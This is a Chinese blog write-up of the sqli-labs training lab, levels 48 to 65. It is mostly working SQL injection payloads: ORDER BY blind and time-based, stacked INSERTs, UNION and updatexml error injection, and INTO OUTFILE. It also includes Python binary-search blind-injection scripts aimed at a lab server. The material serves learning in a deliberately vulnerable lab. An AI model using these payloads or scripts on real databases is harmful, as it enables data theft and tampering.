+<h1 id="less-48"><a href="#less-48" class="headerlink" title="less-48"></a>less-48</h1><p>同 Less 46：</p>
+<p>基于 Bool 盲注</p>
+<blockquote>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=rand((ascii(mid((select database()),<span class="number">1</span>,<span class="number">1</span>)))&gt;<span class="number">65</span>)</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>基于 Time 盲注</p>
+<blockquote>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=<span class="keyword">if</span>(ascii(mid(database(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">115</span>,sleep(<span class="number">0.1</span>),<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>into outfile 参数注入</p>
+<blockquote>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=<span class="number">1</span> into outfile <span class="string">"C:<span class="subst">\\</span>ProgramData<span class="subst">\\</span>MySQL<span class="subst">\\</span>MySQL Server 5.7<span class="subst">\\</span>Uploads<span class="subst">\\</span>data.txt"</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<h1 id="less-49"><a href="#less-49" class="headerlink" title="less-49"></a>less-49</h1><p>基于 Time 盲注</p>
+<blockquote>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=<span class="number">1</span>' and if(ascii(mid(database(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">115</span>,sleep(<span class="number">0.1</span>),<span class="number">0</span>)--+</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h1 id="less-50"><a href="#less-50" class="headerlink" title="less-50"></a>less-50</h1><p>这几关为排序堆叠注入<br>一般后台查询数据库使用的语句都是<code>mysql_query()</code>，而可以堆叠注入的后台使用的是<code>mysqli_multi_query()</code></p>
+<p>使用排序注入的盲注依然可以，但是报错注入在未注释 MySQL 报错信息的时候并不会报错，而返回一个空表：<br><img src="/2020/03/30/sqli-labs38-65/7.jpg" alt><br>我们也可以使用堆叠注入</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1;<span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span>(<span class="keyword">id</span>,username,<span class="keyword">password</span>) <span class="keyword">values</span>(<span class="number">50</span>,<span class="string">'Less50'</span>,<span class="string">'Less50'</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/30/sqli-labs38-65/8.jpg" alt></p>
+<h1 id="less-51"><a href="#less-51" class="headerlink" title="less-51"></a>less-51</h1><p>基于错误_GET_字符型_单引号_排序堆叠注入</p>
+<blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1';<span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span>(<span class="keyword">id</span>,username,<span class="keyword">password</span>) <span class="keyword">values</span>(<span class="number">51</span>,<span class="string">'Less51'</span>,<span class="string">'Less51'</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<p><img src="/2020/03/30/sqli-labs38-65/9.jpg" alt></p>
+<h1 id="less-52"><a href="#less-52" class="headerlink" title="less-52"></a>less-52</h1><p>基于Bool_GET_数字型_盲注_堆叠注入</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1;<span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span>(<span class="keyword">id</span>,username,<span class="keyword">password</span>) <span class="keyword">values</span>(<span class="number">52</span>,<span class="string">'Less52'</span>,<span class="string">'Less52'</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="Less-53"><a href="#Less-53" class="headerlink" title="Less 53"></a>Less 53</h1><p>基于Bool_GET_单引号_字符型_盲注_堆叠注入</p>
+<blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1';<span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span>(<span class="keyword">id</span>,username,<span class="keyword">password</span>) <span class="keyword">values</span>(<span class="number">53</span>,<span class="string">'Less53'</span>,<span class="string">'Less53'</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<p><img src="/2020/03/30/sqli-labs38-65/10.jpg" alt></p>
+<p>从这里开始就是第四部分了，sqli-labs一共65个关卡，准备用这一篇来完结。自less-1到这里差不多用了快一个月了，基本一周也就花个一两天来学习SQL注入，所以学到的知识还是很散乱，记忆也不深刻。后面准备花时间回来总结巩固一下┗( ▔, ▔ )┛<!--more--></p>
+<h1 id="less-54"><a href="#less-54" class="headerlink" title="less-54"></a>less-54</h1><p>基于错误_GET_单引号_字符型_UNION注入<br>必须 在10次查询内获得秘钥，就是基础的联合注入</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1'union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(secret_536Y),<span class="number">3</span> <span class="keyword">from</span> CXBEWPCN9F<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/30/sqli-labs38-65/1.jpeg" alt></p>
+<h1 id="less-55"><a href="#less-55" class="headerlink" title="less-55"></a>less-55</h1><p>这一关比较坑，测试了很久发现是数字型+小括号闭合。</p>
+<blockquote>
+<p>表名<br>id=0) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’challenges’–+</p>
+<p>列名<br>id=0) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’CHUFQ8P62W’–+</p>
+<p>数据<br>id=0) union select 1,group_concat(secret_PXKK),3 from CHUFQ8P62W–+</p>
+</blockquote>
+<p><img src="/2020/03/30/sqli-labs38-65/2.jpeg" alt></p>
+<h1 id="less-56"><a href="#less-56" class="headerlink" title="less-56"></a>less-56</h1><p>这一关为单引号+括号闭合</p>
+<h1 id="less-57"><a href="#less-57" class="headerlink" title="less-57"></a>less-57</h1><p>这一关为双引号无括号闭合<br>这些关感觉很重复。。</p>
+<h1 id="less-58"><a href="#less-58" class="headerlink" title="less-58"></a>less-58</h1><p>这一关测试后为单引号闭合，但是使用联合注入始终不回显，所以改用双注入或者报错注入<br>报错注入：</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">数据库名</span><br><span class="line"><span class="number">0</span>' or updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,database(),<span class="number">0x7e</span>),<span class="number">1</span>)--+</span><br><span class="line">表名</span><br><span class="line"><span class="number">0</span>' or updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select group_concat(table_name) from information_schema.tables where table_schema='challenges'),<span class="number">0x7e</span>),<span class="number">1</span>)--+</span><br><span class="line">列名</span><br><span class="line">id=<span class="number">0</span>' or updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select group_concat(column_name) from information_schema.columns where table_name='L5EO2900B1'),<span class="number">0x7e</span>),<span class="number">1</span>)--+</span><br><span class="line">数据</span><br><span class="line">id=<span class="number">0</span>' or updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select group_concat(secret_EVL2) from L5EO2900B1),<span class="number">0x7e</span>),<span class="number">1</span>)--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/30/sqli-labs38-65/3.jpeg" alt></p>
+<p>双注入</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=0' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">count</span>(*),<span class="keyword">concat_ws</span>(<span class="string">'_'</span>,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="keyword">floor</span>(<span class="keyword">rand</span>()*<span class="number">2</span>)) <span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables%<span class="number">20</span> <span class="keyword">group</span> <span class="keyword">by</span> a <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<p>这个双注入payload实在是太长了，不仔细就很容易写错，以后还要多加练习</p>
+<h1 id="less-59"><a href="#less-59" class="headerlink" title="less-59"></a>less-59</h1><p>这一关为数字型注入，任然使用双查询或者报错注入，过滤了注释，所以id只能=0<br>双注入</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,count(*),concat_ws(<span class="string">'_'</span>,(<span class="keyword">select</span> <span class="keyword">database</span>()),floor(rand()*<span class="number">2</span>)) <span class="keyword">as</span> a <span class="keyword">from</span> information_schema.<span class="keyword">tables</span>%<span class="number">20</span> <span class="keyword">group</span> <span class="keyword">by</span> a</span><br></pre></td></tr></table></figure>
+
+<p>报错注入</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">0</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(database()),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/30/sqli-labs38-65/4.jpeg" alt></p>
+<h1 id="less-60"><a href="#less-60" class="headerlink" title="less-60"></a>less-60</h1><p>这一关为双引号+小括号闭合<br>报错注入</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">id</span>=1") <span class="keyword">and</span> updatexml(1,concat(0x7e,(database()),0x7e),1)--+</span><br></pre></td></tr></table></figure>
+
+<p>双注入</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=0") union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">count</span>(*),<span class="keyword">concat_ws</span>(<span class="string">'_'</span>,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="keyword">floor</span>(<span class="keyword">rand</span>()*<span class="number">2</span>)) <span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="less-61"><a href="#less-61" class="headerlink" title="less-61"></a>less-61</h1><p><s>这一关过滤了注释，我们可以使用<code>or&#39;1&#39;=&#39;1</code>来闭合</s><br>然后方法与上几关相同<br>但是在注入额时候发现回显报错多了两个小括号，于是从新测试，发现是单引号+两个小括号闭合，并没有过滤掉注释<br>使用报错注入</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">0</span>')) and updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,database(),<span class="number">0x7e</span>),<span class="number">1</span>)--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/30/sqli-labs38-65/5.jpeg" alt><br>双注入</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0')) union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">count</span>(*),<span class="keyword">concat_ws</span>(<span class="string">'_'</span>,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="keyword">floor</span>(<span class="keyword">rand</span>()*<span class="number">2</span>)) <span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="less-62"><a href="#less-62" class="headerlink" title="less-62"></a>less-62</h1><p>这一关为单引号闭合，但是过滤了注释，可以使用or’来闭合。然后发现使用联合注入和报错注入均无回显，于是考虑盲注，但是由于必须要在130步内做出来，所以我们选择二分法盲注<br>盲注脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">DB=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">    low=<span class="number">32</span></span><br><span class="line">    high=<span class="number">128</span></span><br><span class="line">    mid=(low+high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> high&gt;low:</span><br><span class="line">        payload=<span class="string">"?id=0' or ascii(substr(database(),"</span>+str(i)+<span class="string">",1))&gt;"</span>+str(mid)+<span class="string">" or'"</span></span><br><span class="line">        payload2=<span class="string">"?id=0' or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='challenges'),"</span>+str(i)+<span class="string">",1))&gt;"</span>+str(mid)+<span class="string">" or'"</span></span><br><span class="line">        payload3=<span class="string">"?id=0' or ascii(substr((select column_name from information_schema.columns where table_name='WWC43V137C' limit 2,1),"</span>+str(i)+<span class="string">",1))&gt;"</span>+str(mid)+<span class="string">" or'"</span></span><br><span class="line">        payload4=<span class="string">"?id=0' or ascii(substr((select group_concat(secret_XCW5) from WWC43V137C ),"</span>+str(i)+<span class="string">",1))&gt;"</span>+str(mid)+<span class="string">" or'"</span></span><br><span class="line">        url=<span class="string">"http://116.62.104.172:81/Less-62/"</span>+payload4</span><br><span class="line">        <span class="comment">#print(url)</span></span><br><span class="line">        r=requests.get(url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Your Login name'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low=mid+<span class="number">1</span></span><br><span class="line">            mid=(low+high) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high=mid</span><br><span class="line">        mid=(low+high) // <span class="number">2</span></span><br><span class="line">    DB+=chr(mid)</span><br><span class="line">    print(DB)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/30/sqli-labs38-65/6.jpeg" alt><br>二分法的速度的确很快，<br>大致的流程为</p>
+<blockquote>
+<p>1、mid为left和right的中间值，mid是否和left相等，相等跳到5，如果不等跳到2</p>
+<p>2、请求mid，如果返回正确的页面跳到3，如果返回错误的页面跳到4</p>
+<p>3、返回页面正确，将right赋值为mid</p>
+<p>4、返回页面错误，将left赋值为mid</p>
+<p>5、返回mid值</p>
+</blockquote>
+<h1 id="less-63"><a href="#less-63" class="headerlink" title="less-63"></a>less-63</h1><p>本关为单引号闭合，未过滤注释符<br>脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">DB=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">    low=<span class="number">32</span></span><br><span class="line">    high=<span class="number">128</span></span><br><span class="line">    mid=(low+high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> high&gt;low:</span><br><span class="line">        payload=<span class="string">"?id=0' or ascii(substr(database(),"</span>+str(i)+<span class="string">",1))&gt;"</span>+str(mid)+<span class="string">" --+"</span></span><br><span class="line">        payload2=<span class="string">"?id=0' or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='challenges'),"</span>+str(i)+<span class="string">",1))&gt;"</span>+str(mid)+<span class="string">" --+"</span></span><br><span class="line">        payload3=<span class="string">"?id=0' or ascii(substr((select column_name from information_schema.columns where table_name='NK6CAXDABM' limit 2,1),"</span>+str(i)+<span class="string">",1))&gt;"</span>+str(mid)+<span class="string">" --+"</span></span><br><span class="line">        payload4=<span class="string">"?id=0' or ascii(substr((select group_concat(secret_BKHX) from NK6CAXDABM ),"</span>+str(i)+<span class="string">",1))&gt;"</span>+str(mid)+<span class="string">" --+"</span></span><br><span class="line">        url=<span class="string">"http://116.62.104.172:81/Less-63/"</span>+payload4</span><br><span class="line">        <span class="comment">#print(url)</span></span><br><span class="line">        r=requests.get(url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Your Login name'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low=mid+<span class="number">1</span></span><br><span class="line">            mid=(low+high) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high=mid</span><br><span class="line">        mid=(low+high) // <span class="number">2</span></span><br><span class="line">    DB+=chr(mid)</span><br><span class="line">    print(DB)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/30/sqli-labs38-65/7.jpeg" alt></p>
+<h1 id="less-64"><a href="#less-64" class="headerlink" title="less-64"></a>less-64</h1><p>本关为数字型盲注<br>脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">DB=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">    low=<span class="number">32</span></span><br><span class="line">    high=<span class="number">128</span></span><br><span class="line">    mid=(low+high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> high&gt;low:</span><br><span class="line">        payload=<span class="string">"?id=1 and ascii(substr(database(),"</span>+str(i)+<span class="string">",1))&gt;"</span>+str(mid)</span><br><span class="line">        payload2=<span class="string">"?id=1 and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='challenges'),"</span>+str(i)+<span class="string">",1))&gt;"</span>+str(mid)</span><br><span class="line">        payload3=<span class="string">"?id=1 and ascii(substr((select column_name from information_schema.columns where table_name='NI5Q7GBP8D' limit 2,1),"</span>+str(i)+<span class="string">",1))&gt;"</span>+str(mid)</span><br><span class="line">        payload4=<span class="string">"?id=1 and ascii(substr((select group_concat(secret_XCQ7) from NI5Q7GBP8D),"</span>+str(i)+<span class="string">",1))&gt;"</span>+str(mid)</span><br><span class="line">        url=<span class="string">"http://116.62.104.172:81/Less-64/"</span>+payload4</span><br><span class="line">        <span class="comment">#print(url)</span></span><br><span class="line">        r=requests.get(url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Your Login name'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low=mid+<span class="number">1</span></span><br><span class="line">            mid=(low+high) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high=mid</span><br><span class="line">        mid=(low+high) // <span class="number">2</span></span><br><span class="line">    DB+=chr(mid)</span><br><span class="line">    print(DB)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/30/sqli-labs38-65/8.jpeg" alt></p>
+<h1 id="less-65"><a href="#less-65" class="headerlink" title="less-65"></a>less-65</h1><p>这一关为双引号+括号闭合<br>脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">DB=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">    low=<span class="number">32</span></span><br><span class="line">    high=<span class="number">128</span></span><br><span class="line">    mid=(low+high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> high&gt;low:</span><br><span class="line">        payload=<span class="string">"?id=0\") or ascii(substr(database(),"</span>+str(i)+<span class="string">",1))&gt;"</span>+str(mid)+<span class="string">" --+"</span></span><br><span class="line">        payload2=<span class="string">"?id=0\") or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='challenges'),"</span>+str(i)+<span class="string">",1))&gt;"</span>+str(mid)+<span class="string">" --+"</span></span><br><span class="line">        payload3=<span class="string">"?id=0\") or ascii(substr((select column_name from information_schema.columns where table_name='THSLMU136W' limit 2,1),"</span>+str(i)+<span class="string">",1))&gt;"</span>+str(mid)+<span class="string">" --+"</span></span><br><span class="line">        payload4=<span class="string">"?id=0\") or ascii(substr((select group_concat(secret_KM0T) from THSLMU136W),"</span>+str(i)+<span class="string">",1))&gt;"</span>+str(mid)+<span class="string">" --+"</span></span><br><span class="line">        url=<span class="string">"http://116.62.104.172:81/Less-65/"</span>+payload4</span><br><span class="line">        <span class="comment">#print(url)</span></span><br><span class="line">        r=requests.get(url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Your Login name'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low=mid+<span class="number">1</span></span><br><span class="line">            mid=(low+high) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high=mid</span><br><span class="line">        mid=(low+high) // <span class="number">2</span></span><br><span class="line">    DB+=chr(mid)</span><br><span class="line">    print(DB)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/30/sqli-labs38-65/9.jpeg" alt><br>sqli-labs到这来就结束了，大概花了一个月的时间，后面这几关更像是对以前学习的一个复习(联合查询，报错注入，双注入，盲注)。从这一系列实验中学到了一些基本的sql注入技巧和判断注入类型，期间一直参考<a href="https://www.jianshu.com/u/f5a5bfa4f659" target="_blank" rel="noopener">Hyafinthus</a>大佬的文章，写得十分详细，建议参考ヾ(●´∀｀●) 。后面会将这些基本的sql注入技巧做一个总结，以加深记忆。</p>
+
+      
+    </div>
+    
+    
+    
+
+    <div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script>
+  <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
+  <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
+  <span>文章作者:</span><a href="/" title="访问 CyzCc 的个人博客">CyzCc</a><br>
+  <span>最后更新:</span>2020年04月17日 09:04:31<br>
+  <span>原始链接:</span><a href="/2020/03/30/sqli-labs38-65/" title="sqli-labs38-65">https://cyzcc.vip/2020/03/30/sqli-labs38-65/</a><br>
+  <span>版权声明:</span>转载请注明出处！<br>  
+</div>
+
+      
+</div>
+	
+	
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>您的支持就是我的动力！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechatpay.jpg" alt="CyzCc Thanks"/>
+        <p>Thanks</p>
+      </div>
+    
+
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+      <div>
+        
+          <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------　　　　本文结束　<i class="fa fa-heart"></i>　感谢您的阅读　　　　-------------</div>
+    
+</div>
+
+        
+      </div>
+
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/sqli-labs/" rel="tag"><i class="fa fa-tag"></i> sqli_labs</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/03/30/pachongchuangguan/" rel="next" title="爬虫闯关游戏">
+                <i class="fa fa-chevron-left"></i> 爬虫闯关游戏
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/03/30/MRCTF&WUST-CTF/" rel="prev" title="MRCTF和WUST-CTF部分题目复现">
+                MRCTF和WUST-CTF部分题目复现 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.gif"
+                alt="CyzCc" />
+            
+              <p class="site-author-name" itemprop="name">CyzCc</p>
+              <p class="site-description motion-element" itemprop="description">卍~~黑玫瑰将再次绽放~~卐</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">58</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/yourname" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="1643277253@qq.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="http://www.heibanke.com/lesson/crawler_ex00/" target="_blank" title="爬虫闯关">
+                      
+                        <i class="fa fa-fw fa-globe"></i>爬虫闯关</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://adworld.xctf.org.cn/" target="_blank" title="攻防世界">
+                      
+                        <i class="fa fa-fw fa-globe"></i>攻防世界</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://buuoj.cn/" target="_blank" title="BUUCTF">
+                      
+                        <i class="fa fa-fw fa-globe"></i>BUUCTF</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://ctf.bugku.com/" target="_blank" title="BUGKU">
+                      
+                        <i class="fa fa-fw fa-globe"></i>BUGKU</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="http://xss-quiz.int21h.jp/" target="_blank" title="XSS-challenges">
+                      
+                        <i class="fa fa-fw fa-globe"></i>XSS-challenges</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://ctf.hutc.xyz/" target="_blank" title="HUCTF">
+                      
+                        <i class="fa fa-fw fa-globe"></i>HUCTF</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://paper.seebug.org/" target="_blank" title="Paper">
+                      
+                        <i class="fa fa-fw fa-globe"></i>Paper</a>
+                  </span>
